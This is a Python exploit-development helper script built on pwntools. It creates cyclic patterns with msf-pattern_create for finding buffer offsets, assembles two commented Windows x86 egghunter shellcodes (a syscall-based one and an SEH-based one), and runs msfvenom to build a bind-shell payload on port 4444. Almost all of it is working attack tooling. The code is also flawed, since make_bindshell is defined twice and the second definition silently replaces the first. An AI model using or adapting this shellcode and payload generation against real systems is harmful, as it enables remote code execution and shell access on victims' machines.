#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from struct import pack
from textwrap import wrap

def read_file_as_bytes(filepath):
  """Reads the contents of a file as a bytes object.

  Args:
    filepath: The path to the file.

  Returns:
    A bytes object containing the file's contents, or None if an error occurs.
  """
  try:
    with open(filepath, "rb") as f:
      return f.read()
  except FileNotFoundError:
    print(f"Error: File '{filepath}' not found.")
    return None
  except Exception as e:
    print(f"Error reading file '{filepath}': {e}")
    return None

def generate_all_hex_bytes():
  """Generates a list of all possible byte values in hexadecimal representation.

  Returns:
    A list of two-digit hexadecimal bytes
  """
  hex_bytes = []
  for i in range(256):
    hex_bytes.append(bytes.fromhex(format(i, '02x')))
  return hex_bytes

def create_pattern(size):
    """use msfpattern_create to create a string.  Takes in a length and returns the pattern."""
    # create pattern using msf-pattern_create to find offset
    myCMD = f"msf-pattern_create -l {size}"
    stream = os.popen(myCMD)
    myPattern = stream.read()
    myPattern = myPattern.strip().encode()
    return myPattern


def make_egg(eggID):
    """make an egghunter!  Takes in 4 ASCII bytes for the egg ID and return the shellcode identified should be in hex ascii, and be repeated twice
windows systems only"""

    pwn.info(f"Making egg with identifier {eggID}{eggID}")

    # make little endian
    eggID = eggID[::-1]
    hexEggID = binascii.hexlify(eggID).decode('ascii')
    pwn.info(f"Egg hex little Endian: {hexEggID}")

    # https://docs.pwntools.com/en/stable/asm.html
    pwn.context.clear()
    pwn.context.arch = 'i386'

    assembly = (
    # We use the edx register as a memory page counter
    "							 "
    "	loop_inc_page:			 "
            # Go to the last address in the memory page
    "		or dx, 0x0fff		;"
    "	loop_inc_one:			 "
            # Increase the memory counter by one
    "		inc edx				;"
    "	loop_check:				 "
            # Save the edx register which holds our memory 
            # address on the stack
    "		push edx			;"
            # Push the system call number (negative)
            # and reverse it
    "		push 0xfffffe3a		;"
    "       pop eax             ;"
    "       neg eax             ;"
            # Initialize the call to NtAccessCheckAndAuditAlarm
            # Perform the system call
    "		int 0x2e			;"
            # Check for access violation, 0xc0000005 
            # (ACCESS_VIOLATION)
    "		cmp al,05			;"
            # Restore the edx register to check later 
            # for our egg
    "		pop edx				;"
    "	loop_check_valid:		 "
            # If access violation encountered, go to n
            # ext page
    "		je loop_inc_page	;"
    "	is_egg:					 "
            # Load egg (w00t in this example) into 
            # the eax register
    f"		mov eax, 0x{hexEggID};"
            # Initializes pointer with current checked 
            # address 
    "		mov edi, edx		;"
            # Compare eax with doubleword at edi and 
            # set status flags
    "		scasd				;"
            # No match, we will increase our memory 
            # counter by one
    "		jnz loop_inc_one	;"
            # First part of the egg detected, check for 
            # the second part
    "		scasd				;"
            # No match, we found just a location 
            # with half an egg
    "		jnz loop_inc_one	;"
    "	matched:				 "
            # The edi register points to the first 
            # byte of our buffer, we can jump to it
    "		jmp edi				;"
    )

    # create shellcode that can be sent (bytes)
    shellcode = pwn.asm(assembly)

    # OPCodes as a string
    hexString = binascii.hexlify(shellcode).decode('utf-8')
    pwn.info(f"OPCodes: {hexString}")
    pwn.info(f"EggHunter Length: {len(shellcode)}")
    return shellcode
    # write to an executable ELF
    #myElf = pwn.ELF.from_assembly(assembly)
    #myElf.save('POC.elf')


def make_egg_SEH(eggID):
    """Improves upon the regular egghunter by using SEH. Takes in 4 ASCII bytes.  Larger payload!
    windows systems only"""

    pwn.info(f"Making SEH egg with identifier {eggID}{eggID}")

    # make little endian
    eggID = eggID[::-1]
    hexEggID = binascii.hexlify(eggID).decode('ascii')
    pwn.info(f"Egg hex little Endian: {hexEggID}")

    # https://docs.pwntools.com/en/stable/asm.html
    pwn.context.clear()
    pwn.context.arch = 'i386'

    assembly = (
"	start: 									 "
        # jump to a negative call to dynamically 
        # obtain egghunter position
"		jmp get_seh_address 				;"
"	build_exception_record: 				 "
        # pop the address of the exception_handler 
        # into ecx
"		pop ecx 							;"
        # mov signature into eax
f"		mov eax, 0x{hexEggID} 				;"
        # push Handler of the 
        # _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;"
        # push Next of the 
        # _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;"
        # null out ebx
"		xor ebx, ebx 						;"
        # overwrite ExceptionList in the TEB with a pointer
        # to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;"
        # subtract 0x4 from the pointer to exception handler
"       sub ecx, 0x4                        ;"
        # add 0x4 to ebx
"       add ebx, 0x4                        ;"
        # overwrite the StackBase in the TEB
"       mov dword ptr fs:[ebx], ecx         ;"
"	is_egg: 								 "
        # push 0x02
"		push 0x02 							;"
        # pop the value into ecx which will act 
        # as a counter
"		pop ecx 							;"
        # mov memory address into edi
"		mov edi, ebx 						;"
        # check for our signature, if the page is invalid we 
        # trigger an exception and jump to our exception_handler function
"		repe scasd 							;"
        # if we didn't find signature, increase ebx 
        # and repeat
"		jnz loop_inc_one 					;"
        # we found our signature and will jump to it
"		jmp edi 							;"
"	loop_inc_page: 							 "
        # if page is invalid the exception_handler will 
        # update eip to point here and we move to next page
"		or bx, 0xfff 						;"
"	loop_inc_one: 							 "
        # increase ebx by one byte
"		inc ebx 							;"
        # check for signature again
"		jmp is_egg 							;"
"	get_seh_address: 						 "
        # call to a higher address to avoid null bytes & push 
        # return to obtain egghunter position
"		call build_exception_record 		;"
        # push 0x0c onto the stack
"		push 0x0c 							;"
        # pop the value into ecx
"		pop ecx 							;"
        # mov into eax the pointer to the CONTEXT 
        # structure for our exception
"		mov eax, [esp+ecx] 					;"
        # mov 0xb8 into ecx which will act as an 
        # offset to the eip
"		mov cl, 0xb8						;"
        # increase the value of eip by 0x06 in our CONTEXT 
        # so it points to the "or bx, 0xfff" instruction 
        # to increase the memory page
"		add dword ptr ds:[eax+ecx], 0x06	;"
        # save return value into eax
"		pop eax 							;"
        # increase esp to clean the stack for our call
"		add esp, 0x10 						;"
        # push return value back into the stack
"		push eax 							;"
        # null out eax to simulate 
        # ExceptionContinueExecution return
"		xor eax, eax 						;"
        # return
"		ret 								;"
)

    # create shellcode that can be sent (bytes)
    shellcode = pwn.asm(assembly)

    # OPCodes as a string
    hexString = binascii.hexlify(shellcode).decode('utf-8')
    pwn.info(f"OPCodes: {hexString}")
    pwn.info(f"EggHunter Length: {len(shellcode)}")
    return shellcode
    # write to an executable ELF
    #myElf = pwn.ELF.from_assembly(assembly)
    #myElf.save('POC.elf')

def make_bindshell(badchars):
    """Uses msfvenom to make a bindshell payload.  Send badcharacters as an escaped string"""
    # generate payload
    port = 4444
    pwn.info(f"Making bindshell on {port}.")
    pwn.info(f"Badchars are: {badchars}")

    payloadFileName = "payload.file"
    command = f'msfvenom -p windows/shell_bind_tcp LPORT=4444 -b "{badchars}" -f raw > {payloadFileName}'
    pwn.info(f"Payload command string is: {command}")
    return_code = os.system(command)
    shellcode = read_file_as_bytes(payloadFileName)
    pwn.info(f"Shellcode length: {len(shellcode)}")
    return shellcode
def make_bindshell():
    """Uses msfvenom to make a bindshell payload.  Send badcharacters as an escaped string"""
    # generate payload
    port = 4444
    pwn.info(f"Making bindshell on {port}.")
    pwn.info(f"Badchars are: NONE")

    payloadFileName = "payload.file"
    command = f'msfvenom -p windows/shell_bind_tcp LPORT=4444 -f raw > {payloadFileName}'
    pwn.info(f"Payload command string is: {command}")
    return_code = os.system(command)
    shellcode = read_file_as_bytes(payloadFileName)
    pwn.info(f"Shellcode length: {len(shellcode)}")
    return shellcode



# test
#eggID = b"w00t"
#make_egg(eggID)
#make_egg_SEH(eggID)
#bindshell = make_bindshell("\\x00\\x0a\\x0d\\x25")
